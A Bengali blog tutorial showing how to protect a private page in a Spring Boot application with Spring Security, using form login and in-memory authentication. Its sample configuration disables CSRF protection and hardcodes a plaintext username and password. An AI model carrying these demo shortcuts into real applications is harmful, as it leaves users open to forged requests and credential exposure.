+<p>যেকোন ওয়েব অ্যাপ্লিকেশন এর ক্ষেত্রে সিকিউরিটি একটি অত্যন্ত গুরুত্বপুর্ণ ব্যাপার। আমরা জানি ইন্টারনেট প্রচুর দুষ্ট লোকজন দিয়ে ভর্তি  । অনেক অনেক বিনিদ্র রজনী পার করে লাইনের পর লাইন কোড লিখে যখন অবশেষে আমরা আমাদের অ্যাপটিকে নিজস্ব লোকাল সার্ভার থেকে ইন্তারনেট নামক সেই ভয়াল জঙ্গলে আপ্লোড করি, আমরা চাই আমাদের অতি আদরের ছোট্ট অ্যাপটি যেন সেইসব দুষ্ট লোকজনের থেকে নিরাপদে থাকে। আমরা চাই আমাদের অ্যাপ্লিকেশন এর কিছু কিছু অংশ শুধু মাত্র কিছু স্পেশাল লোকজন (অথেনটিকেড ইউজার) যেন দেখতে পায়। কিন্তু কিভাবে? শুনে মনে হচ্ছে অনেক কিছু করতে হবে। অনেক অনেক কোড লিখতে হবে। কিন্তু আমরা তো আরামপ্রিয় মানুষ  ( হেটার্স রা বলবে আইলসা  )। আমরা তো এত কস্ট করতে চাইনা! আমরা শুধু চাই আমাদের অ্যাপ্লিকেশন টিকে সিকিউর করতে। টেনশন নিয়েন না। আপনার আমার মত আইলসা পাব্লিকের জন্যই <a href="https://pivotal.io/" rel="nofollow noopener" target="_blank">Pivotal</a> এর জোস জোস বড় ভাইয়েরা বানিয়েছে এক অসসাধারন ফ্রেমওয়ার্ক! নাম তার স্প্রিং সিকিউরিটি  আজকের এই পোস্টে আমি হাল্কার উপর ঝাপসা দিয়ে দেখাবো কিভাবে এই টুল টি ব্যবহার করে আমরা আমাদের ওয়েব অ্যাপ্লিকেশন কে  শত্রুর হাত থেকে নিরাপদে রাখতে পারি  ।</p>
+<h1><strong>কি করবো</strong></h1>
+<p>এখন আসেন  দেখে নেই আমরা আসলে কি করতে চাচ্ছি। আমাদের ঘর (অ্যাপ্লিকেশন) এ <strong>দুই ধরনের</strong>কক্ষ(পেজ/লিঙ্ক) আছে। বসার কক্ষ(<strong>পাব্লিক পেজ</strong>) যেখানে আমজনতা সবাই ঢুকতে পারবে এবং শোবার কক্ষ(<strong>প্রাইভেট পেজ</strong>) যেখানে শুধুমাত্র স্পেশাল মানুসজন( যাদের মন ভালো এবং তাদের কাছে <strong>ইউজারনেম</strong> ও <strong>পাসোওার্ড</strong> আছে)। যখনি কোন আগন্তুক আমাদের শোবার কক্ষে ঢুকতে চাইবে তখন আমরা তাকে একটি লগিন পেজ এ নিয়ে যাবো। সঠিক নামপরিচয়(ইউজারনেম ও পাসওর্ড) দেওয়ার পর ই শুধু মাত্র আমরা তাকে ঢুকতে দিবো।</p>
+<h1><strong>কিভাবে করবো</strong></h1>
+<p>মাত্র ৪ টি সহজ পদক্ষেপে আমরা পুরো কাজটি সেরে ফেলবো। এই টিউটরিয়াল এ আমরা ফ্রেমওয়ার্ক হিসেবে ব্যবহার করবো স্প্রিং বুট।  সুতরাং দেরী না করে চলুন শুরু করা যাক। আপনারা যন্ত্রপাতি নিয়ে তৈরী হয়ে যান(মানে IDE ওপেন করেন আরকি) (যেহেতু এখন আমরা কোড লিখবো, দুষ্টুমি কথাবার্তা একদম ই বাদ। এখন আমরা সবাই সিরিয়াস  )</p>
+<h2>ধাপ ১ঃ ডেমো প্রজেক্ট তৈরীকরন</h2>
+<p>প্রথমে <a href="https://start.spring.io/" rel="nofollow noopener" target="_blank">স্প্রিং ইনিশিয়ালাইজার</a> এ গিয়ে আমরা একটি ডেমো স্টার্টার প্রোজেক্ট তৈরী করবো। ডিপেন্ডেন্সি হিসেবে <strong>Web</strong>, <strong>Security</strong> এবং <strong>Thymeleaf </strong> হলেই চলবে আপাতত। জিপ ফাইলটা আনজিপ করে আপনার পছন্দের IDE তে প্রজেক্ট ইমপোর্ট করুন। (ধরে নিচ্ছি আমরা সবাই জানি কিভাবে স্প্রিং ইনিশিয়ালাইজার থেকে স্টার্টার প্রোজেক্ট ডাউনলোড করতে হয় এবং কিভাবে সেটা IDE তে ওপেন করতে হয়। সুতরাং ঐ ব্যাপারে বিস্তারিত কিছু লিখছি না)</p>
+<h2><strong>ধাপ ২ঃ স্প্রিং সিকিউরিটি কনফিগারেশন</strong></h2>
+<p>এখন আমাদের দরকার একটি কনফিগারেশন ক্লাস যেটাতে আমরা স্প্রিং সিকিউরিটি কনফিগার করবো।  <strong>SecurityConfig.java</strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">package com.rashidul.springsecdemo;
+
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
+import org.springframework.security.config.annotation.web.builders.HttpSecurity;
+import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
+import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
+
+@Configuration
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+@Override
+protected void configure(HttpSecurity http) throws Exception {
+http
+.csrf().disable()
+.authorizeRequests()
+.antMatchers(“/”).permitAll()
+.antMatchers(“/private”).authenticated()
+.and()
+.formLogin()
+.usernameParameter(“user”)
+.passwordParameter(“password”)
+.defaultSuccessUrl(“/private”)
+.loginPage(“/login”);
+}
+
+@Autowired
+public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
+auth.inMemoryAuthentication().withUser(“rashidul”).password(“rashidul123”).roles(“USER”);
+}
+}</pre>
+<p>SecurityConfig.java ক্লাস টা আমরা এক্সটেন্ড করছি WebSecurityConfigurerAdapter ক্লাস থেকে। configure নামে যে মেথড টা ওভাররাইড করা হচ্ছে সেখানে আমরা আসলে বলে দিচ্ছি কোন কোন URL গুলো অথেন্টিকেশন ছাড়াই এক্সেস করা যাবে এবং কোন গুলোর জন্য ইউজার কে প্রথমে লগিন করতে হবে।  configureGlobal মেথড এ বলা হচ্ছে কোন সোর্স থেকে ইউজার এর দেওয়া ইউজারনেম এবং পাসওয়ার্ড এর কম্বিনেশন ভেরিফাই করা হবে। আমাদের জন্য সহজ হবে তাই আমরা এখানে ইন মেমোরি অথেন্টিকেশন ব্যবহার করছি।</p>
+<h2><strong>ধাপ ৩ঃ কিছু দরকারি ফাইল </strong></h2>
+<p>পুরো ব্যাপার টা ঠিক মত কাজ করছে কিনা সেটা পরীক্ষা করার জন্য আমরা কিছু ফাইল তৈরী করবো।</p>
+<ol>
+<li>ResourceController.java</li>
+</ol>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">package com.rashidul.springsecdemo;
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestMapping;
+
+@Controller
+@RequestMapping(“/”)
+public class ResourceController {
+
+@GetMapping(“”)
+public String index(){
+
+return “index”;
+}
+
+@GetMapping(“/private”)
+public String privatePage(){
+
+return “private”;
+}
+
+@GetMapping(“/login”)
+public String loginPage(){
+
+return “login”;
+}
+}</pre>
+<p>2. index.html</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"></pre>
+<h1>Hi, this is a public page. everyone can see this</h1>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"></pre>
+<p>3. private.html</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"><code>
+
+
+    </code></pre>
+<h1>Hi, this is a private page. only authenticated users can see this.</h1>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"><code>
+
+</code></pre>
+<p>4. login.html</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="html"></pre>
+<h1>Bro you need to login first</h1>
+<form action="login" method="POST"><input name="user" type="text" placeholder="User name" /><br />
+<input name="password" type="password" placeholder="Password" /><br />
+<button type="submit">Submit</button></form>
+<pre class="EnlighterJSRAW" data-enlighter-language="html">
+</pre>
+<p>টেমপ্লেট ফাইল গুলো src/main/resources/templates এই ডিরেক্টরিতে তৈরী করতে হবে।</p>
+<h2><strong>ধাপ ৪ঃ কাজ শেষ, এবার আউটপুট দেখার পালা 😀</strong></h2>
+<p>অ্যাপ্লিকেশন টি রান করে ব্রাউজার এ যদি ওপেন করি তাহলে দেখতে পাবোঃ</p>
+<div class=""><img decoding="async" src="/wp-content/uploads/2018/05/tab-0-1.png" alt="tab 0 1 স্প্রিং সিকিউরিটিঃ আপনার অ্যাপ্লিকেশনের সুরক্ষায়"></div>
+<p>তারমানে আমরা আমাদের অ্যাপ্লিকেশন এর হোম ইউআরএল অথেনটিকেশন ছাড়াই দেখতে পাবো। কিন্তু আমরা যদি <strong>“/private”</strong> লিঙ্ক এ যাওয়ার চেস্টা করি তাহলে আমাদের কে রিডিরেক্ট করে লগিন পেজ এ নিয়ে যাবে। [/av_textblock] [av_image src=&#8217;/wp-content/uploads/2018/05/tab-1.png&#8217; attachment=&#8217;1629&#8242; attachment_size=&#8217;full&#8217; align=&#8217;center&#8217; styling=&#8221; hover=&#8217;av-hover-grow&#8217; link=&#8221; target=&#8221; caption=&#8221; font_size=&#8221; appearance=&#8221; overlay_opacity=&#8217;0.4&#8242; overlay_color=&#8217;#000000&#8242; overlay_text_color=&#8217;#ffffff&#8217; animation=&#8217;no-animation&#8217; admin_preview_bg=&#8221;][/av_image] [av_textblock size=&#8221; font_color=&#8221; color=&#8221; av-medium-font-size=&#8221; av-small-font-size=&#8221; av-mini-font-size=&#8221; admin_preview_bg=&#8221;] এবং ইউজারনেম/পাসওয়ার্ড দিয়ে লগিন করার পরে আমরা <strong>“/private”</strong> লিঙ্ক অ্যাক্সেস করতে পারবো। [/av_textblock] [av_image src=&#8217;/wp-content/uploads/2018/05/tab-2.png&#8217; attachment=&#8217;1630&#8242; attachment_size=&#8217;full&#8217; align=&#8217;center&#8217; styling=&#8221; hover=&#8217;av-hover-grow&#8217; link=&#8221; target=&#8221; caption=&#8221; font_size=&#8221; appearance=&#8221; overlay_opacity=&#8217;0.4&#8242; overlay_color=&#8217;#000000&#8242; overlay_text_color=&#8217;#ffffff&#8217; animation=&#8217;no-animation&#8217; admin_preview_bg=&#8221;][/av_image] [av_textblock size=&#8221; font_color=&#8221; color=&#8221; av-medium-font-size=&#8221; av-small-font-size=&#8221; av-mini-font-size=&#8221; admin_preview_bg=&#8221;] স্প্রিং বেজড অ্যাপ্লিকেশন এ অথেনটিকেশন এবং অথোরাইজেশন এর জন্য স্প্রিং সিকিউরিটি খুব ই ফ্লেক্সিবল একটা ফ্রেমওয়ার্ক। অনেক ধরনের কনফিগারেশন অপশন আছে সুতরাং আপনি আপনার প্রয়োজনমত এটাকে কনফিগার করে নিতে পারবেন। আজকে আমি খুব ই বেসিক কিছু দেখানর চেস্টা করলাম(কারন হাতে সময় কম এবং আমি খুব ই আইলসা 😞 )  কিন্তু ভবিষ্যতে হয়তো এই ব্যাপারে আরো বিস্তারিত আলোচনা হবে। ভালো থাকবেন সবাই 🤓 <strong>সোর্সকোডঃ</strong> <a href="https://github.com/rashidul-hasan/spring-security-demo" rel="nofollow noopener" target="_blank">https://github.com/rashidul-hasan/spring-security-demo</a></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/%e0%a6%b8%e0%a7%8d%e0%a6%aa%e0%a7%8d%e0%a6%b0%e0%a6%bf%e0%a6%82-%e0%a6%b8%e0%a6%bf%e0%a6%95%e0%a6%bf%e0%a6%89%e0%a6%b0%e0%a6%bf%e0%a6%9f%e0%a6%bf%e0%a6%83-%e0%a6%86%e0%a6%aa%e0%a6%a8%e0%a6%be%e0%a6%b0/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
